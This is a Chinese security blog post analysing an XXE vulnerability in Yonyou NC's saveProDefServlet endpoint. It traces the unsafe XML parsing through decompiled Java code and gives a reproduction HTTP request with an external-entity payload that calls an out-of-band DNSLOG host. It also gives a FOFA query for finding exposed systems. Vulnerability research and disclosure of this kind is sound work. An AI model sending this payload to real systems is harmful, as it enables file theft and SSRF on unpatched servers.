---
title: "用友NC saveProDefServlet XML实体注入（XXE）漏洞"
source: https://mrxn.net/jswz/yonyou-nc-saveProDefServlet-xxe-ssrf.html
asset_dir: assets/用友nc-saveprodefservlet-xml实体注入（xxe）漏洞
---

# 用友NC saveProDefServlet XML实体注入（XXE）漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/10/11 08:27
- 737浏览
- [0评论](#comment)
- 31分钟阅读

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)NC系统存在XML外部实体注入（[XXE](https://mrxn.net/tag/XXE)）漏洞。攻击者可通过构造恶意XML内容，利用`saveProDefServlet`接口解析，实现任意文件读取或[SSRF](https://mrxn.net/tag/SSRF)攻击等攻击，进而可能导致敏感信息泄露或进一步的系统入侵。

代码安全审计

# 影响版本

NC63、NC65

# fofa语法

> app="用友-UFIDA-NC"

# 漏洞分析

这个洞（旧洞 是在审计之前的一个老洞的时候发现的

[![用友NC saveProDefServlet XML实体注入（XXE）漏洞](images/img-001-9736a57b858b.webp)](https://image.mrxn.net/7cbcb7d6412d4b7e93dabc8894a57586.webp)

那就搜索`saveProDefServlet`，找到了 `nc/uap/wfm/action/SaveProDefServlet.class` 看下它的实现吧

漏洞预警服务

```
@Servlet(
    path = "/servlet/saveProDefServlet"
)
public class SaveProDefServlet extends WfBaseServlet {
    private static final String NEW_PRODEF_PK = "NewProdefPk";
    private static final long serialVersionUID = 856521354399862503L;
    private static final String ROOT_DOC_TAG = "Root";
    private static final String RESULT_DOC_TAG = "Result";
    private static final String ISNEWVERSION_DOC_TAG = "IsNewVersion";
    private static final String ISINSERTNEW_DOC_TAG = "IsInsertNew";

    @Action(
        method = "POST"
    )
    public void doPost() {
        String proDefXml = this.request.getParameter("prodefxml");
        String isNewVersion = "false";
        String newProdefPk = null;
        String isInsertNew = "false";
        this.response.setCharacterEncoding("utf-8");
        this.response.setContentType("text/html");
        PrintWriter out = null;

        try {
            out = this.response.getWriter();
        } catch (IOException e1) {
            WfmLogger.error(e1.getMessage(), e1);
            throw new LfwRuntimeException(e1.getMessage());
        }

        try {
            proDefXml = URLDecoder.decode(proDefXml, "UTF-8");
        } catch (UnsupportedEncodingException e) {
            WfmLogger.error(e.getMessage(), e);
            throw new LfwRuntimeException(e.getMessage());
        }

        String checkRsult = this.checkProdefXml(proDefXml);
```

`prodefxml`参数的值被带入了**checkProdefXml**方法，跟进看下它的实现

计算机科学

```
private String checkProdefXml(String proDefXml) {
    String result = "";

    try {
        ProDef prodef = ProcessParser.getInstance().parse(proDefXml);
```

继续跟进`ProcessParser`的**parse**方法

```
import org.apache.commons.digester3.Digester;
......
public ProDef parse(String prodefxml) throws WfmServiceException {
    if (prodefxml != null && prodefxml.length() != 0) {
        Reader reader = null;

        ProDef var7;
        try {
            String xmlpath = "Definitions/Process";
            Digester digester = new Digester();
            reader = new StringReader(prodefxml);
            digester.setValidating(false);
            int count = 0;
            this.recursSubProcess(digester, xmlpath, count);
            ProDef proDef = (ProDef)digester.parse(reader);
```

接收`prodefxml`后使用`Apache Commons Digester` 库将其解析成一个 `ProDef` 对象。

由于代码在解析用户传入的XML内容时，未对XML解析器进行安全配置以禁用外部实体的解析，造成了 **XML外部实体注入（[XXE](https://mrxn.net/tag/XXE)）漏洞**。攻击者可利用此漏洞读取服务器上的任意文件、发起服务端请求伪造（[SSRF](https://mrxn.net/tag/SSRF)）或进行拒绝服务攻击。

搜索引擎

# 漏洞复现

> 需要注意 prodefxml 参数的值需要双重URL编码

```
POST /portal/pt/servlet/saveProDefServlet/doPost?pageId=login HTTP/1.1
Host: nc.mrxn.net
Content-Type: application/x-www-form-urlencoded

prodefxml={{url({{url(<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>)}})}}
```

[![用友NC saveProDefServlet XML实体注入（XXE）漏洞](images/img-002-135bcc35865e.webp)](https://image.mrxn.net/562a12e49fcb45db8f6fe8706d4b2a71.webp)

在DNSLOG平台收到DNS和HTTP请求

计算机科学

# 参考

- [关于NC系统saveProDefServlet接口的sql注入漏洞的安全通告](https://security.yonyou.com/#/noticeInfo?id=532)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)
- [#XXE](https://mrxn.net/tag/XXE)
- [#SSRF](https://mrxn.net/tag/SSRF)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
